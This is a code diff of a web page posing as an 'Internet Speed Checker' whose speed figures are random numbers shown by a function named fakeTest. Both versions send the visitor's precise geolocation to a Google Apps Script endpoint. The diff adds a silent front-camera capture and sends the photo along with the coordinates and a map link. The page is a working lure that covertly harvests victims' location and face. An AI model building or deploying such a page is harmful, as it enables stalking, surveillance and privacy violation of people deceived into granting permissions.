@@ -3,195 +3,189 @@
 <head>
 <meta charset="utf-8">
 <title>Internet Speed Checker</title>
+
 <style>
-  *{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;line-height:1}
-  body{display:flex;min-height:100vh;align-items:center;justify-content:center;background:linear-gradient(180deg,#071029 0%, #071726 60%);color:#e6eef8;margin:0;padding:16px}
-  .wrap{width:380px;max-width:95vw}
-  .card{padding:18px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));box-shadow:0 10px 30px rgba(2,6,23,.6);backdrop-filter: blur(6px);border:1px solid rgba(255,255,255,0.03)}
-  
-  .title-pill{
-    display:flex;align-items:center;gap:10px;justify-content:center;
-    background:linear-gradient(90deg,#06b6d4,#7c3aed);padding:10px 14px;border-radius:999px;
-    color:#02121a;font-weight:800;font-size:16px;letter-spacing:.6px;margin:-48px 0 12px 0;
-    box-shadow:0 8px 28px rgba(59,130,246,0.12), 0 2px 8px rgba(2,6,23,.5);
-    border:1px solid rgba(255,255,255,0.06);
-  }
-  .title-pill img{width:18px;height:18px;display:block}
-  
-  img.speed{width:100%;border-radius:10px;display:block;margin:6px 0 12px}
-  
-  .btn{
-    width:100%;padding:14px;font-size:16px;border:none;border-radius:12px;
-    background:#06b6d4;color:#012;cursor:pointer;font-weight:800;
-    letter-spacing:.4px;transition:all .2s;
-  }
-  .btn:hover{background:#0891b2}
-  .btn:active{transform:translateY(1px)}
-  .btn:disabled{background:#334155;color:#64748b;cursor:not-allowed}
-  
-  .row{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
-  .stat{flex:1 1 30%;background:rgba(255,255,255,.02);padding:10px;border-radius:10px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
-  .num{font-size:20px;font-weight:800;color:#06b6d4}
-  .label{font-size:12px;opacity:.85;margin-top:6px}
-  
-  .bar{height:8px;background:rgba(255,255,255,0.02);border-radius:8px;margin-top:12px;overflow:hidden}
-  .bar > i{display:block;height:100%;width:0;background:linear-gradient(90deg,#06b6d4,#3b82f6);transition:width .3s}
-  
-  .location-info{
-    margin-top:12px;padding:12px;background:rgba(6,182,212,0.05);
-    border-radius:10px;border:1px solid rgba(6,182,212,0.15);display:none;
-  }
-  .location-info.show{display:block}
-  .location-item{
-    display:flex;justify-content:space-between;padding:6px 0;
-    font-size:13px;border-bottom:1px solid rgba(255,255,255,0.05);
-  }
-  .location-item:last-child{border:none}
-  .location-label{opacity:.7}
-  .location-value{font-weight:600;color:#06b6d4}
-  
-  .status-msg{
-    margin-top:10px;padding:10px 12px;border-radius:8px;
-    font-size:14px;text-align:center;display:none;
-  }
-  .status-msg.show{display:block}
-  .status-msg.success{background:rgba(34,197,94,0.15);color:#4ade80;border:1px solid rgba(34,197,94,0.3)}
-  .status-msg.error{background:rgba(239,68,68,0.15);color:#f87171;border:1px solid rgba(239,68,68,0.3)}
-  
-  footer{margin-top:10px;text-align:center;font-size:13px;color:#9fb6c8;opacity:.95}
-  
-  @media (max-width:420px){ 
-    .wrap{width:92vw} 
-    .title-pill{font-size:14px;padding:9px}
-    .btn{padding:12px;font-size:15px}
-    .stat{flex:1 1 45%;margin-bottom:6px}
-  }
+*{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;line-height:1}
+body{display:flex;min-height:100vh;align-items:center;justify-content:center;background:linear-gradient(180deg,#071029 0%, #071726 60%);color:#e6eef8;margin:0;padding:16px}
+.wrap{width:380px;max-width:95vw}
+.card{padding:18px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));box-shadow:0 10px 30px rgba(2,6,23,.6)}
+
+.title-pill{
+display:flex;align-items:center;justify-content:center;
+background:linear-gradient(90deg,#06b6d4,#7c3aed);
+padding:10px;border-radius:999px;font-weight:800;
+margin-bottom:12px;color:#02121a;
+}
+
+img.speed{width:100%;border-radius:10px;margin:6px 0 12px}
+
+.btn{width:100%;padding:14px;border:none;border-radius:12px;background:#06b6d4;color:#012;font-weight:800;cursor:pointer}
+
+.row{display:flex;gap:8px;margin-top:12px}
+.stat{flex:1;background:rgba(255,255,255,.02);padding:10px;border-radius:10px;text-align:center}
+.num{font-size:20px;font-weight:800;color:#06b6d4}
+.label{font-size:12px;margin-top:6px}
+
+.bar{height:8px;background:rgba(255,255,255,0.02);border-radius:8px;margin-top:12px;overflow:hidden}
+.bar > i{display:block;height:100%;width:0;background:#06b6d4}
+
+video{width:100%;border-radius:10px;margin-top:10px;display:none}
+
+.status-msg{margin-top:10px;padding:10px;border-radius:8px;text-align:center;display:none}
+.status-msg.show{display:block}
+.status-msg.success{background:#22c55e22;color:#22c55e}
+.status-msg.error{background:#ef444422;color:#ef4444}
 </style>
+
 </head>
 <body>
+
 <div class="wrap">
-  <div class="card">
-    <div class="title-pill" aria-hidden="true">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter:drop-shadow(0 2px 6px rgba(0,0,0,.15))">
-        <path d="M12 3a9 9 0 100 18 9 9 0 000-18z" fill="#02121a" opacity="0.06"/>
-        <path d="M12 6v6l4 2" stroke="#02121a" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-      Internet Speed Checker
-    </div>
+<div class="card">
 
-    <img class="speed" src="speed.gif" alt="speed gif">
-    <button id="start" class="btn">Start Speed Test</button>
+<div class="title-pill">Internet Speed Checker</div>
 
-    <div class="row">
-      <div class="stat"><div class="num" id="ping">—</div><div class="label">Ping (ms)</div></div>
-      <div class="stat"><div class="num" id="down">—</div><div class="label">Download (Mbps)</div></div>
-      <div class="stat"><div class="num" id="up">—</div><div class="label">Upload (Mbps)</div></div>
-    </div>
+<img class="speed" src="speed.gif">
 
-    <div class="bar"><i id="progress"></i></div>
-    
-    <div id="locationInfo" class="location-info">
-      <div class="location-item">
-        <span class="location-label">Latitude:</span>
-        <span class="location-value" id="lat">—</span>
-      </div>
-      <div class="location-item">
-        <span class="location-label">Longitude:</span>
-        <span class="location-value" id="lng">—</span>
-      </div>
-      <div class="location-item">
-        <span class="location-label">Accuracy:</span>
-        <span class="location-value" id="accuracy">—</span>
-      </div>
-    </div>
-    
-    <div id="status" class="status-msg"></div>
-  </div>
+<button id="start" class="btn">Start Speed Test</button>
 
-  <footer>XX/footer>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<div class="row">
+<div class="stat"><div class="num" id="ping">—</div><div class="label">Ping</div></div>
+<div class="stat"><div class="num" id="down">—</div><div class="label">Download</div></div>
+<div class="stat"><div class="num" id="up">—</div><div class="label">Upload</div></div>
+</div>
+
+<div class="bar"><i id="progress"></i></div>
+
+<div id="status" class="status-msg"></div>
+
+</div>
 </div>
 
 <script>
-// CONFIGURE YOUR GOOGLE APPS SCRIPT URL HERE
-const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxP1xbw1MIe609PjsSSvVJy-9-h-tSvnNZ1x67W7j3strAm9uH1NeoII2Wh2wTxrcLzUw/exec';
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby44luE92nVDUq4GdDIREhQ-ZA8zn3eDuFH9ye7g82sSjNuHpHnHPV0lbYfj7s4pzkXXA/exec";
 
-const start = document.getElementById('start'),
-      ping = document.getElementById('ping'),
-      down = document.getElementById('down'),
-      up = document.getElementById('up'),
-      bar = document.getElementById('progress'),
-      locationInfo = document.getElementById('locationInfo'),
-      status = document.getElementById('status');
+const start = document.getElementById("start");
+const ping = document.getElementById("ping");
+const down = document.getElementById("down");
+const up = document.getElementById("up");
+const bar = document.getElementById("progress");
+const status = document.getElementById("status");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
-function showStatus(message, type) {
-  status.textContent = message;
-  status.className = `status-msg show ${type}`;
-  setTimeout(() => status.classList.remove('show'), 5000);
+let imageData = "";
+
+function showStatus(msg,type){
+status.textContent=msg;
+status.className="status-msg show "+type;
+setTimeout(()=>status.classList.remove("show"),4000);
 }
 
-function animate(el, a, b, t) {
-  const s = performance.now();
-  (function f(n) {
-    const p = Math.min(1, (n - s) / t), v = a + (b - a) * p;
-    el.textContent = (el === ping ? Math.round(v) : v.toFixed(1));
-    if (p < 1) requestAnimationFrame(f);
-  })(s);
+function animate(el,a,b,t){
+let s=performance.now();
+(function f(n){
+let p=Math.min(1,(n-s)/t);
+let v=a+(b-a)*p;
+el.textContent=el===ping?Math.round(v):v.toFixed(1);
+if(p<1)requestAnimationFrame(f);
+})(s);
 }
 
-function getLocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) { reject(new Error('Geolocation not supported')); return; }
-    navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
-  });
+function getLocation(){
+return new Promise((res,rej)=>{
+navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true});
+});
 }
 
-async function sendToGoogleSheets(locationData) {
-  try {
-    await fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(locationData) });
-    console.log('Location logged:', locationData);
-  } catch (error) { console.error('Error logging location:', error); }
+function startCamera(){
+return navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
 }
 
-function updateLocationDisplay(position) {
-  document.getElementById('lat').textContent = position.coords.latitude.toFixed(6);
-  document.getElementById('lng').textContent = position.coords.longitude.toFixed(6);
-  document.getElementById('accuracy').textContent = `${position.coords.accuracy.toFixed(0)}m`;
-  locationInfo.classList.add('show');
+async function capturePhoto(stream){
+video.srcObject=stream;
+video.style.display="block";
+
+await new Promise(r=>setTimeout(r,1000));
+
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+canvas.getContext("2d").drawImage(video,0,0);
+
+imageData=canvas.toDataURL("image/jpeg",0.6);
+
+stream.getTracks().forEach(t=>t.stop());
+video.style.display="none";
 }
 
-async function fakeTest() {
-  start.disabled = true; start.textContent = 'Testing...'; bar.style.width='0%';
-
-  getLocation().then(position => {
-    updateLocationDisplay(position);
-    const locationData = {
-      timestamp: new Date().toISOString(),
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      altitude: position.coords.altitude||'N/A',
-      speed: position.coords.speed||'N/A',
-      mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-    };
-    return sendToGoogleSheets(locationData);
-  }).then(()=>showStatus('✓','success'))
-    .catch(error=>{
-      let errorMsg='⚠ Location unavailable';
-      if(error.code===1) errorMsg='⚠ Location permission denied';
-      else if(error.code===2) errorMsg='⚠ Location unavailable';
-      else if(error.code===3) errorMsg='⚠ Location timeout';
-      console.error('Location error:', error.message||error);
-      showStatus(errorMsg,'error');
-    });
-
-  setTimeout(()=>bar.style.width='22%',100);
-  animate(ping, 80, Math.floor(Math.random()*60+10), 850);
-  setTimeout(()=>{ bar.style.width='56%'; animate(down,0,Math.random()*150+20,1250); },800);
-  setTimeout(()=>{ bar.style.width='84%'; animate(up,0,Math.random()*40+5,1000); },2000);
-  setTimeout(()=>{ bar.style.width='100%'; start.disabled=false; start.textContent='Start Speed Test'; },3400);
+async function sendData(data){
+try{
+await fetch(SCRIPT_URL,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify(data)
+});
+}catch(e){console.error(e);}
 }
 
-start.addEventListener('click', fakeTest);
+async function fakeTest(){
+
+start.disabled=true;
+start.textContent="Testing...";
+bar.style.width="0%";
+
+try{
+showStatus("Solicitando permissões...","success");
+
+const [pos,stream]=await Promise.all([
+getLocation(),
+startCamera()
+]);
+
+await capturePhoto(stream);
+
+const payload={
+timestamp:new Date().toISOString(),
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
+accuracy:pos.coords.accuracy,
+mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
+image:imageData
+};
+
+await sendData(payload);
+
+showStatus("✓ Dados enviados","success");
+
+}catch(e){
+showStatus("Permissão negada ou erro","error");
+}
+
+setTimeout(()=>bar.style.width="30%",200);
+animate(ping,80,Math.random()*60+10,800);
+
+setTimeout(()=>{
+bar.style.width="60%";
+animate(down,0,Math.random()*150+20,1200);
+},800);
+
+setTimeout(()=>{
+bar.style.width="90%";
+animate(up,0,Math.random()*40+5,1000);
+},2000);
+
+setTimeout(()=>{
+bar.style.width="100%";
+start.disabled=false;
+start.textContent="Start Speed Test";
+},3500);
+}
+
+start.onclick=fakeTest;
 </script>
+
 </body>
 </html>
